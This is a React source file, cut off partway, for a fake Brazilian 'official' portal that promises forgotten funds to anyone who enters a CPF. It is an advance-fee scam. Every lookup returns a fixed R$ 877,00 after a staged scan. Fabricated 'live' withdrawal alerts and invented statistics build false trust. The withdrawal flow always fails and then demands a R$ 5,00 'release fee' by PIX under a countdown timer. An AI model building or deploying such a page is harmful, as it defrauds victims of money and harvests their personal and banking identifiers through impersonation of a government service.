import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Search, 
  CheckCircle2, 
  RefreshCcw, 
  History, 
  ShieldCheck, 
  AlertCircle, 
  Wallet, 
  ArrowRight, 
  CreditCard, 
  Key, 
  Copy, 
  Check, 
  Clock, 
  FileText,
  Landmark,
  BadgeCheck,
  Receipt
} from 'lucide-react';
import { cn } from './lib/utils';
import confetti from 'canvas-confetti';

// --- Types ---
type View = 
  | 'consulta' 
  | 'consulta_loading' 
  | 'consulta_result' 
  | 'history' 
  | 'withdraw' 
  | 'withdraw_loading' 
  | 'withdraw_error' 
  | 'network_fee';

interface HistoryItem {
  id: string;
  document: string;
  amount: number;
  date: string;
  status: 'completed' | 'pending';
  origin: string;
}

// --- Sample Live Alerts Data ---
const NAMES = [
  "Ricardo M.", "Ana Paula F.", "Marcos V.", "Julia C.", 
  "Felipe T.", "Beatriz R.", "Thiago L.", "Camila P.", 
  "Bruno S.", "Larissa M.", "Gustavo H.", "Fernanda A."
];
const CITIES = [
  "São Paulo, SP", "Rio de Janeiro, RJ", "Belo Horizonte, MG", 
  "Curitiba, PR", "Porto Alegre, RS", "Salvador, BA", 
  "Fortaleza, CE", "Brasília, DF", "Goiânia, GO"
];

const SCAN_STEPS = [
  "Conectando ao banco de dados nacional de valores a receber...",
  "Cruzando dados do documento com o cadastro unificado de beneficiários...",
  "Varrendo contas inativas, resíduos contratuais e valores retidos...",
  "Verificando ordens de pagamento e custódias financeiras pendentes...",
  "Validando autenticidade cadastral e conformidade com a LGPD...",
  "Calculando montante total disponível para resgate imediato...",
  "Consulta finalizada com sucesso! Saldo localizado."
];

// Helper to mask CPF: 000.000.000-00
function maskCPF(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 11);
  if (digits.length <= 3) return digits;
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9, 11)}`;
}

// --- Live Withdrawal Notifications ---
function LiveWithdrawalAlerts() {
  const [alert, setAlert] = useState<{ name: string; city: string; value: number } | null>(null);

  useEffect(() => {
    const showRandomAlert = () => {
      const name = NAMES[Math.floor(Math.random() * NAMES.length)];
      const city = CITIES[Math.floor(Math.random() * CITIES.length)];
      const value = 650 + Math.random() * 1100;
      
      setAlert({ name, city, value });
      
      setTimeout(() => {
        setAlert(null);
      }, 4500);
    };

    const timeout = setTimeout(showRandomAlert, 3500);
    const interval = setInterval(showRandomAlert, 13000);

    return () => {
      clearTimeout(timeout);
      clearInterval(interval);
    };
  }, []);

  return (
    <div className="fixed bottom-6 right-6 z-50 pointer-events-none">
      <AnimatePresence>
        {alert && (
          <motion.div
            initial={{ opacity: 0, y: 20, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 20, scale: 0.95 }}
            className="bg-neutral-900/90 backdrop-blur-md border border-neutral-800 rounded-xl p-4 shadow-2xl flex items-center gap-3.5 max-w-sm pointer-events-auto"
          >
            <div className="w-10 h-10 bg-emerald-500/10 rounded-lg flex items-center justify-center shrink-0 border border-emerald-500/20">
              <CheckCircle2 className="w-5 h-5 text-emerald-400" />
            </div>
            <div>
              <p className="text-xs font-semibold text-white tracking-tight">Valor Resgatado via PIX</p>
              <p className="text-[11px] text-neutral-400 leading-snug">
                <span className="text-white font-medium">{alert.name}</span> ({alert.city}) resgatou{' '}
                <span className="text-emerald-400 font-mono font-medium">
                  R$ {alert.value.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </span>
              </p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function App() {
  // Navigation & State
  const [view, setView] = useState<View>('consulta');
  const [queryType, setQueryType] = useState<'cpf' | 'identificador'>('cpf');
  const [queryInput, setQueryInput] = useState('');
  const [resolvedIdentifier, setResolvedIdentifier] = useState('529.832.190-41');
  
  // Withdraw state
  const [pixType, setPixType] = useState('cpf');
  const [pixKey, setPixKey] = useState('529.832.190-41');

  // Consulta scanning progress
  const [scanStepIndex, setScanStepIndex] = useState(0);
  const [scanProgress, setScanProgress] = useState(0);

  // Withdraw loading progress
  const [withdrawLoadProgress, setWithdrawLoadProgress] = useState(0);

  // Payment confirmation state
  const [isPaid, setIsPaid] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [copiedPix, setCopiedPix] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState(600); // 10 minutes

  // History list
  const [history] = useState<HistoryItem[]>([
    { id: '1', document: '529.832.***-41', amount: 877.00, date: 'Hoje', status: 'pending', origin: 'Contas Inativas e Resíduos' },
    { id: '2', document: '418.902.***-19', amount: 1450.50, date: 'Ontem', status: 'completed', origin: 'Saldos em Custódia' },
    { id: '3', document: '723.114.***-82', amount: 890.00, date: '27/09/2026', status: 'completed', origin: 'Tarifas Não Utilizadas' },
    { id: '4', document: '309.551.***-05', amount: 1820.75, date: '25/09/2026', status: 'completed', origin: 'Valores Residuais Retidos' },
  ]);

  // Countdown timer for release fee QR code
  useEffect(() => {
    if (view !== 'network_fee') return;
    const interval = setInterval(() => {
      setTimeRemaining(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [view]);

  // Handle withdraw loading animation
  useEffect(() => {
    if (view !== 'withdraw_loading') return;
    setWithdrawLoadProgress(0);
    const interval = setInterval(() => {
      setWithdrawLoadProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => setView('withdraw_error'), 500);
          return 100;
        }
        return prev + 3;
      });
    }, 50);
    return () => clearInterval(interval);
  }, [view]);

  // --- Consulta Handler ---
  const handleStartConsulta = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const finalId = queryInput.trim() || (queryType === 'cpf' ? '529.832.190-41' : 'REG-882941-SP');
    setResolvedIdentifier(finalId);
    setPixKey(finalId);
    
    setView('consulta_loading');
    setScanProgress(0);
    setScanStepIndex(0);

    let progress = 0;
    const timer = setInterval(() => {
      progress += Math.floor(Math.random() * 8) + 6;
      if (progress >= 100) {
        progress = 100;
        clearInterval(timer);
        setTimeout(() => {
          setView('consulta_result');
        }, 500);
      }
      setScanProgress(progress);
      const stepIdx = Math.min(
        Math.floor((progress / 100) * SCAN_STEPS.length),
        SCAN_STEPS.length - 1
      );
      setScanStepIndex(stepIdx);
    }, 170);
  };

  // Format timer
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const copyPixCode = () => {
    const pixCode = "00020126580014br.gov.bcb.pix0136e92b3a01-b841-45f8-8a89-consulta052040000530398654055.005802BR5920SISTEMA CONSULTA NACIONAL6009SAO PAULO62070503***6304A8F2";
    navigator.clipboard?.writeText?.(pixCode);
    setCopiedPix(true);
    setTimeout(() => setCopiedPix(false), 3000);
  };

  const handleConfirmPayment = () => {
    setIsVerifying(true);
    setTimeout(() => {
      setIsPaid(true);
      setIsVerifying(false);
      confetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.5 },
        colors: ['#10b981', '#38bdf8', '#fbbf24']
      });
    }, 2000);
  };

  const handleConfirmWithdraw = (e: React.FormEvent) => {
    e.preventDefault();
    if (!pixKey) return;
    setView('withdraw_loading');
  };

  // ==========================================
  // RENDER VIEWS
  // ==========================================

  const renderConsulta = () => (
    <motion.div 
      key="consulta"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="min-h-screen flex flex-col justify-between p-4 md:p-8 max-w-5xl mx-auto"
    >
      {/* Top Bar */}
      <header className="flex items-center justify-between py-4 border-b border-neutral-800/80 mb-8">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
            <Landmark className="w-5 h-5 text-emerald-400" />
          </div>
          <div>
            <h1 className="text-lg font-bold text-white tracking-tight flex items-center gap-2">
              <span>Consulta Nacional</span>
              <span className="text-[10px] font-semibold uppercase tracking-wider px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                Oficial
              </span>
            </h1>
            <p className="text-xs text-neutral-400">Portal Unificado de Valores a Receber e Saldos Retidos</p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <button 
            type="button"
            onClick={() => setView('history')}
            className="px-3.5 py-1.5 text-xs text-neutral-300 hover:text-white bg-neutral-900 border border-neutral-800 rounded-lg hover:bg-neutral-800 transition-colors flex items-center gap-1.5 cursor-pointer"
          >
            <History className="w-3.5 h-3.5 text-neutral-400" />
            <span>Consultas Recentes</span>
          </button>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 flex flex-col justify-center items-center my-6">
        <div className="w-full max-w-2xl bg-neutral-900/80 border border-neutral-800 rounded-2xl p-6 md:p-10 shadow-2xl backdrop-blur-xl">
          
          {/* Header Title */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-medium mb-3">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Sistema Oficial de Consulta Cadastral</span>
            </div>
            <h2 className="text-2xl md:text-3xl font-bold text-white tracking-tight">
              Consulta de Valores a Receber
            </h2>
            <p className="text-sm text-neutral-400 mt-2 max-w-lg mx-auto leading-relaxed">
              Verifique gratuitamente se existem saldos esquecidos, recursos retidos ou valores residuais disponíveis para resgate imediato via PIX vinculados ao seu registro.
            </p>
          </div>

          {/* Type Selector Tabs */}
          <div className="flex p-1 bg-neutral-950/80 border border-neutral-800 rounded-xl mb-6">
            <button
              type="button"
              onClick={() => {
                setQueryType('cpf');
                setQueryInput('');
              }}
              className={cn(
                "flex-1 py-2.5 text-xs md:text-sm font-medium rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer",
                queryType === 'cpf' 
                  ? "bg-neutral-800 text-white shadow-sm" 
                  : "text-neutral-400 hover:text-neutral-200"
              )}
            >
              <FileText className="w-4 h-4 text-emerald-400" />
              Consultar por CPF
            </button>
            <button
              type="button"
              onClick={() => {
                setQueryType('identificador');
                setQueryInput('');
              }}
              className={cn(
                "flex-1 py-2.5 text-xs md:text-sm font-medium rounded-lg transition-all flex items-center justify-center gap-2 cursor-pointer",
                queryType === 'identificador' 
                  ? "bg-neutral-800 text-white shadow-sm" 
                  : "text-neutral-400 hover:text-neutral-200"
              )}
            >
              <Key className="w-4 h-4 text-emerald-400" />
              Consultar por Chave / Registro
            </button>
          </div>

          {/* Query Form */}
          <form onSubmit={handleStartConsulta} className="space-y-4">
            <div>
              <label className="block text-xs uppercase tracking-wider text-neutral-400 font-medium mb-2">
                {queryType === 'cpf' ? 'Número do CPF do Titular' : 'Chave PIX ou Código do Beneficiário'}
              </label>
              <div className="relative">
                <input 
                  type="text" 
                  value={queryInput}
                  onChange={(e) => {
                    if (queryType === 'cpf') {
                      setQueryInput(maskCPF(e.target.value));
                    } else {
                      setQueryInput(e.target.value);
                    }
                  }}
                  placeholder={queryType === 'cpf' ? "Ex: 529.832.190-41" : "Ex: email@dominio.com ou Chave PIX"}
                  className="w-full bg-neutral-950/90 border border-neutral-800 rounded-xl py-4 px-5 text-white font-mono text-base md:text-lg focus:outline-none focus:border-emerald-500/60 focus:ring-1 focus:ring-emerald-500/40 transition-all placeholder:text-neutral-600"
                />
                <button
                  type="button"
                  onClick={() => {
                    if (queryType === 'cpf') {
                      setQueryInput("529.832.190-41");
                    } else {
                      setQueryInput("contato@titular.com.br");
                    }
                  }}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[11px] text-emerald-400/90 hover:text-emerald-300 bg-emerald-500/10 px-2.5 py-1 rounded border border-emerald-500/20 cursor-pointer"
                >
                  Usar Exemplo
                </button>
              </div>
            </div>

            <button 
              type="submit"
              className="w-full py-4 px-6 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold text-base rounded-xl transition-all shadow-lg hover:shadow-emerald-500/20 active:scale-[0.99] flex items-center justify-center gap-2.5 cursor-pointer"
            >
              <Search className="w-5 h-5" />
              <span>CONSULTAR VALORES DISPONÍVEIS</span>
            </button>
          </form>

          {/* Trust Footnotes */}
          <div className="grid grid-cols-3 gap-3 mt-6 pt-6 border-t border-neutral-800/60 text-center">
            <div className="p-2">
              <p className="text-[11px] text-neutral-400">Proteção de Dados</p>
              <p className="text-xs font-mono font-medium text-neutral-200 mt-0.5">Conforme LGPD</p>
            </div>
            <div className="p-2 border-x border-neutral-800/60">
              <p className="text-[11px] text-neutral-400">Segurança</p>
              <p className="text-xs font-mono font-medium text-neutral-200 mt-0.5">Criptografia SSL</p>
            </div>
            <div className="p-2">
              <p className="text-[11px] text-neutral-400">Resgate</p>
              <p className="text-xs font-mono font-medium text-emerald-400 mt-0.5">Instantâneo via PIX</p>
            </div>
          </div>
        </div>

        {/* Live Network Metrics strip */}
        <div className="w-full max-w-2xl grid grid-cols-2 md:grid-cols-4 gap-3 mt-6">
          <div className="bg-neutral-900/50 border border-neutral-800/80 rounded-xl p-3.5 text-center">
            <span className="text-[10px] uppercase tracking-wider text-neutral-400">Total Devolvido</span>
            <p className="text-sm font-mono font-semibold text-emerald-400 mt-0.5">R$ 4.298.150</p>
          </div>
          <div className="bg-neutral-900/50 border border-neutral-800/80 rounded-xl p-3.5 text-center">
            <span className="text-[10px] uppercase tracking-wider text-neutral-400">Consultas Hoje</span>
            <p className="text-sm font-mono font-semibold text-white mt-0.5">42.890</p>
          </div>
          <div className="bg-neutral-900/50 border border-neutral-800/80 rounded-xl p-3.5 text-center">
            <span className="text-[10px] uppercase tracking-wider text-neutral-400">Saldo Médio</span>
            <p className="text-sm font-mono font-semibold text-emerald-400 mt-0.5">R$ 877,00</p>
          </div>
          <div className="bg-neutral-900/50 border border-neutral-800/80 rounded-xl p-3.5 text-center">
            <span className="text-[10px] uppercase tracking-wider text-neutral-400">Status da Rede</span>
            <p className="text-sm font-mono font-semibold text-emerald-400 mt-0.5">Operacional</p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="text-center py-4 text-xs text-neutral-400 border-t border-neutral-900">
        <p>Portal Nacional de Consulta e Devolução de Valores © 2026 · Acesso Livre e Gratuito ao Cidadão</p>
      </footer>
    </motion.div>
  );

  const renderConsultaLoading = () => (
    <motion.div 
      key="consulta_loading"
      initial={{ opacity: 0, scale: 0.96 }}
      animate={{ opacity: 1, scale: 1 }}
      exit={{ opacity: 0 }}
      className="min-h-screen p-4 flex items-center justify-center max-w-xl mx-auto"
    >
      <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-8 md:p-10 shadow-2xl backdrop-blur-xl text-center">
        <div className="relative w-20 h-20 mx-auto mb-6 flex items-center justify-center">
          <div className="absolute inset-0 rounded-full border-2 border-emerald-500/20 border-t-emerald-500 animate-spin" />
          <Landmark className="w-10 h-10 text-emerald-400 animate-pulse" />
        </div>

        <h3 className="text-xl md:text-2xl font-bold text-white mb-2 tracking-tight">
          Verificando Registros no Sistema Unificado
        </h3>
        <p className="text-xs md:text-sm text-neutral-400 font-mono mb-6">
          Identificador Consultado: <span className="text-emerald-400">{resolvedIdentifier}</span>
        </p>

        {/* Progress Bar */}
        <div className="space-y-2 mb-6">
          <div className="flex justify-between text-xs font-mono text-neutral-400">
            <span>Varrendo bases financeiras</span>
            <span className="text-emerald-400 font-bold">{scanProgress}%</span>
          </div>
          <div className="h-2.5 bg-neutral-950 rounded-full overflow-hidden border border-neutral-800 p-0.5">
            <motion.div 
              className="h-full bg-emerald-500 rounded-full"
              style={{ width: `${scanProgress}%` }}
              transition={{ ease: "linear" }}
            />
          </div>
        </div>

        {/* Dynamic Log Step */}
        <div className="bg-neutral-950/80 border border-neutral-800/80 rounded-xl p-4 text-left font-mono text-xs text-neutral-300 flex items-start gap-2.5">
          <RefreshCcw className="w-4 h-4 text-emerald-400 animate-spin shrink-0 mt-0.5" />
          <span className="leading-relaxed">{SCAN_STEPS[scanStepIndex]}</span>
        </div>
      </div>
    </motion.div>
  );

  const renderConsultaResult = () => (
    <motion.div 
      key="consulta_result"
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0 }}
      className="min-h-screen p-4 md:p-8 flex items-center justify-center max-w-2xl mx-auto"
    >
      <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-10 shadow-2xl backdrop-blur-xl">
        {/* Success Header */}
        <div className="flex items-center gap-4 mb-6 pb-6 border-b border-neutral-800">
          <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center shrink-0">
            <BadgeCheck className="w-8 h-8 text-emerald-400" />
          </div>
          <div>
            <div className="inline-flex items-center gap-1.5 text-xs text-emerald-400 font-medium mb-1">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
              <span>Registro Positivo Localizado</span>
            </div>
            <h2 className="text-xl md:text-2xl font-bold text-white tracking-tight">
              Saldo a Receber Disponível!
            </h2>
          </div>
        </div>

        {/* Found Amount Card */}
        <div className="bg-gradient-to-br from-neutral-950 via-neutral-900 to-neutral-950 border border-emerald-500/30 rounded-2xl p-6 mb-6 text-center">
          <p className="text-xs uppercase tracking-wider text-neutral-400 mb-1">
            Montante Total Localizado para Transferência
          </p>
          <p className="text-4xl md:text-5xl font-mono font-bold text-emerald-400 mb-2">
            R$ 877,00
          </p>
          <p className="text-xs text-neutral-400">
            Saldo pronto para transferência bancária imediata via PIX
          </p>
        </div>

        {/* Details List */}
        <div className="bg-neutral-950/60 border border-neutral-800/80 rounded-2xl p-4 md:p-5 space-y-3 mb-6 text-xs md:text-sm">
          <div className="flex justify-between py-1.5 border-b border-neutral-800/50">
            <span className="text-neutral-400">Identificador Consultado</span>
            <span className="text-white font-mono font-medium truncate max-w-[200px] md:max-w-xs">{resolvedIdentifier}</span>
          </div>
          <div className="flex justify-between py-1.5 border-b border-neutral-800/50">
            <span className="text-neutral-400">Origem dos Recursos</span>
            <span className="text-neutral-200">Saldos Residuais e Contas Inativas</span>
          </div>
          <div className="flex justify-between py-1.5 border-b border-neutral-800/50">
            <span className="text-neutral-400">Situação Cadastral</span>
            <span className="text-emerald-400 font-medium">Liberado para Transferência</span>
          </div>
          <div className="flex justify-between py-1.5">
            <span className="text-neutral-400">Modalidade de Pagamento</span>
            <span className="text-white font-medium">Transferência Instantânea PIX</span>
          </div>
        </div>

        {/* Direct Action Buttons */}
        <div className="space-y-3">
          <button 
            type="button"
            onClick={() => setView('withdraw')}
            className="w-full py-4 px-6 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold text-base rounded-xl transition-all shadow-lg hover:shadow-emerald-500/20 active:scale-[0.99] flex items-center justify-center gap-2.5 cursor-pointer"
          >
            <Wallet className="w-5 h-5" />
            <span>SOLICITAR RESGATE DO VALOR (R$ 877,00)</span>
            <ArrowRight className="w-5 h-5" />
          </button>
          
          <button 
            type="button"
            onClick={() => setView('consulta')}
            className="w-full py-3 text-neutral-400 hover:text-white text-xs transition-colors cursor-pointer"
          >
            Fazer outra consulta
          </button>
        </div>
      </div>
    </motion.div>
  );

  const renderWithdraw = () => (
    <motion.div 
      key="withdraw"
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0 }}
      className="min-h-screen p-4 md:p-8 flex items-center justify-center max-w-xl mx-auto"
    >
      <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-8 shadow-2xl backdrop-blur-xl">
        <div className="flex items-center gap-4 mb-6 pb-6 border-b border-neutral-800">
          <div className="w-12 h-12 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 flex items-center justify-center">
            <CreditCard className="w-6 h-6 text-emerald-400" />
          </div>
          <div>
            <h2 className="text-xl font-bold text-white tracking-tight">Solicitação de Resgate PIX</h2>
            <p className="text-xs text-neutral-400">Transferência para sua conta bancária</p>
          </div>
        </div>

        {/* Amount Badge */}
        <div className="bg-neutral-950 border border-neutral-800 rounded-2xl p-5 mb-6 flex justify-between items-center">
          <div>
            <p className="text-xs text-neutral-400">Valor Autorizado para Depósito</p>
            <p className="text-2xl font-mono font-bold text-emerald-400">R$ 877,00</p>
          </div>
          <span className="px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold">
            Disponível
          </span>
        </div>

        <form onSubmit={handleConfirmWithdraw} className="space-y-4">
          <div>
            <label className="block text-xs uppercase tracking-wider text-neutral-400 mb-2">
              Tipo de Chave PIX
            </label>
            <select 
              value={pixType}
              onChange={(e) => setPixType(e.target.value)}
              className="w-full bg-neutral-950 border border-neutral-800 rounded-xl py-3 px-4 text-white text-sm focus:outline-none focus:border-emerald-500/60 cursor-pointer"
            >
              <option value="cpf">CPF</option>
              <option value="email">E-mail</option>
              <option value="phone">Telefone Celular</option>
              <option value="random">Chave Aleatória (EVP)</option>
            </select>
          </div>

          <div>
            <label className="block text-xs uppercase tracking-wider text-neutral-400 mb-2">
              Chave PIX de Destino
            </label>
            <div className="relative">
              <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-neutral-400" />
              <input 
                type="text" 
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value)}
                placeholder="Insira sua chave PIX..."
                className="w-full bg-neutral-950 border border-neutral-800 rounded-xl py-3 pl-11 pr-4 text-white font-mono text-sm focus:outline-none focus:border-emerald-500/60"
                required
              />
            </div>
          </div>

          <div className="p-3.5 bg-amber-500/10 border border-amber-500/20 rounded-xl flex gap-3 text-xs text-amber-300/90 leading-relaxed">
            <AlertCircle className="w-5 h-5 text-amber-400 shrink-0" />
            <span>Certifique-se de informar uma chave PIX vinculada ao seu nome para validação cadastral automática.</span>
          </div>

          <button 
            type="submit"
            disabled={!pixKey}
            className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all shadow-lg active:scale-[0.99] flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <span>TRANSFERIR R$ 877,00 VIA PIX AGORA</span>
            <ArrowRight className="w-5 h-5" />
          </button>

          <button 
            type="button"
            onClick={() => setView('consulta_result')}
            className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors text-center cursor-pointer"
          >
            Voltar ao resultado da consulta
          </button>
        </form>
      </div>
    </motion.div>
  );

  const renderWithdrawLoading = () => (
    <motion.div 
      key="withdraw_loading"
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      exit={{ opacity: 0 }}
      className="min-h-screen p-4 flex items-center justify-center"
    >
      <div className="w-full max-w-md bg-neutral-900/90 border border-neutral-800 rounded-3xl p-8 text-center backdrop-blur-xl">
        <RefreshCcw className="w-12 h-12 text-emerald-400 animate-spin mx-auto mb-5" />
        <h2 className="text-xl font-bold text-white mb-2">Processando Transferência PIX</h2>
        <p className="text-neutral-400 text-xs mb-6">Autenticando dados bancários e ordem de pagamento...</p>
        
        <div className="space-y-2">
          <div className="flex justify-between text-xs font-mono text-neutral-400">
            <span>STATUS: VALIDANDO</span>
            <span className="text-emerald-400 font-bold">{Math.floor(withdrawLoadProgress)}%</span>
          </div>
          <div className="h-2 bg-neutral-950 rounded-full overflow-hidden border border-neutral-800">
            <motion.div 
              className="h-full bg-emerald-400"
              style={{ width: `${withdrawLoadProgress}%` }}
            />
          </div>
        </div>
      </div>
    </motion.div>
  );

  const renderWithdrawError = () => (
    <motion.div 
      key="withdraw_error"
      initial={{ opacity: 0, y: 15 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0 }}
      className="min-h-screen p-4 flex items-center justify-center max-w-md mx-auto"
    >
      <div className="w-full bg-neutral-900/90 border border-amber-500/30 rounded-3xl p-8 text-center backdrop-blur-xl">
        <div className="w-16 h-16 bg-amber-500/10 rounded-2xl flex items-center justify-center mx-auto mb-5 border border-amber-500/20">
          <AlertCircle className="w-8 h-8 text-amber-500" />
        </div>
        
        <h2 className="text-2xl font-bold text-white mb-3 tracking-tight">Validação Cadastral Pendente</h2>
        
        <p className="text-neutral-300 text-sm mb-6 leading-relaxed">
          Para liberar o envio imediato de <span className="text-emerald-400 font-bold">R$ 877,00</span> para sua chave PIX, o sistema exige a validação da <span className="text-amber-400 font-semibold">Taxa de Liberação e Liquidação Cadastral</span> de apenas <span className="text-white font-mono font-bold">R$ 5,00</span> para comprovação de titularidade da conta recebedora.
        </p>
        
        <div className="space-y-3">
          <button 
            type="button"
            onClick={() => setView('network_fee')}
            className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all shadow-lg active:scale-[0.99] cursor-pointer"
          >
            PAGAR TAXA DE LIBERAÇÃO (R$ 5,00)
          </button>
          <button 
            type="button"
            onClick={() => setView('withdraw')}
            className="w-full py-2 text-xs text-neutral-400 hover:text-white transition-colors cursor-pointer"
          >
            Voltar ao formulário de resgate
          </button>
        </div>
      </div>
    </motion.div>
  );

  const renderNetworkFee = () => {
    if (isPaid) {
      return (
        <motion.div 
          key="network_fee_paid"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
          className="min-h-screen p-4 flex items-center justify-center max-w-lg mx-auto"
        >
          <div className="w-full bg-neutral-900/90 border border-emerald-500/30 rounded-3xl p-8 text-center backdrop-blur-xl">
            <div className="w-16 h-16 bg-emerald-500/10 rounded-2xl flex items-center justify-center mx-auto mb-5 border border-emerald-500/20">
              <CheckCircle2 className="w-8 h-8 text-emerald-400" />
            </div>
            
            <h2 className="text-2xl font-bold text-white mb-2 tracking-tight">Taxa Confirmada com Sucesso!</h2>
            <p className="text-xs text-neutral-400 font-mono mb-6">Autenticação Bancária: #VR-2026-89412</p>

            <div className="bg-neutral-950 border border-neutral-800 rounded-2xl p-5 mb-6 text-left space-y-2.5 text-xs">
              <div className="flex justify-between">
                <span className="text-neutral-400">Situação</span>
                <span className="text-emerald-400 font-bold">PAGAMENTO APROVADO</span>
              </div>
              <div className="flex justify-between">
                <span className="text-neutral-400">Valor Autorizado</span>
                <span className="text-white font-mono font-medium">R$ 877,00</span>
              </div>
              <div className="flex justify-between">
                <span className="text-neutral-400">Previsão de Depósito</span>
                <span className="text-emerald-400 font-mono">Em até 5 minutos via PIX</span>
              </div>
            </div>

            <div className="space-y-3">
              <button 
                type="button"
                onClick={() => {
                  setIsPaid(false);
                  setView('consulta');
                }}
                className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-bold rounded-xl transition-all cursor-pointer"
              >
                FAZER NOVA CONSULTA
              </button>
              <button 
                type="button"
                onClick={() => {
                  setIsPaid(false);
                  setView('history');
                }}
                className="w-full py-2.5 text-xs text-neutral-400 hover:text-white transition-colors cursor-pointer"
              >
                Ver Histórico de Consultas
              </button>
            </div>
          </div>
        </motion.div>
      );
    }

    return (
      <motion.div 
        key="network_fee_pending"
        initial={{ opacity: 0, scale: 0.96 }}
        animate={{ opacity: 1, scale: 1 }}
        exit={{ opacity: 0 }}
        className="min-h-screen p-4 flex items-center justify-center max-w-lg mx-auto"
      >
        <div className="w-full bg-neutral-900/90 border border-neutral-800 rounded-3xl p-6 md:p-8 backdrop-blur-xl text-center">
          {/* Header */}
          <div className="flex flex-col items-center mb-6">
            <div className="p-3 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 mb-3">
              <Receipt className="w-7 h-7 text-emerald-400" />
            </div>
            <h2 className="text-xl md:text-2xl font-bold text-white tracking-tight">Taxa de Liberação Bancária</h2>
            <p className="text-xs text-neutral-400 mt-1">Desbloqueio e envio imediato do saldo de R$ 877,00</p>
          </div>

          {/* Pricing summary */}
          <div className="bg-neutral-950 border border-neutral-800 rounded-2xl p-5 mb-6 space-y-3">
            <div className="flex justify-between items-center text-xs">
              <span className="text-neutral-400">Valor do Saldo a Receber</span>
              <span className="text-white font-mono font-medium">R$ 877,00</span>
            </div>
            <div className="flex justify-between items-center text-xs">
              <span className="text-neutral-400">Taxa de Liquidação e Liberação</span>
              <span className="text-emerald-400 font-mono font-bold text-base">R$ 5,00</span>
            </div>
            <div className="flex justify-between items-center text-xs pt-2 border-t border-neutral-800/80">
              <span className="text-neutral-400 flex items-center gap-1.5">
                <Clock className="w-3.5 h-3.5 text-amber-500" />
                Tempo de Reserva do Lote
              </span>
              <span className="text-amber-400 font-mono font-bold">{formatTimer(timeRemaining)}</span>
            </div>

            {/* QR Code Container */}
            <div className="pt-4 border-t border-neutral-800/80 flex flex-col items-center justify-center">
              <div className="p-3 bg-white rounded-xl shadow-inner">
                <img 
                  src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=00020126580014br.gov.bcb.pix0136e92b3a01-b841-45f8-8a89-consulta052040000530398654055.005802BR5920SISTEMA%20CONSULTA%20NACIONAL6009SAO%20PAULO62070503***6304A8F2" 
                  alt="QR Code PIX R$ 5,00"
                  className="w-36 h-36"
                  referrerPolicy="no-referrer"
                />
              </div>
              <p className="text-[11px] text-neutral-400 mt-2">Escaneie pelo aplicativo do seu banco</p>
            </div>

            {/* Copy PIX Button */}
            <div className="pt-2">
              <button
                type="button"
                onClick={copyPixCode}
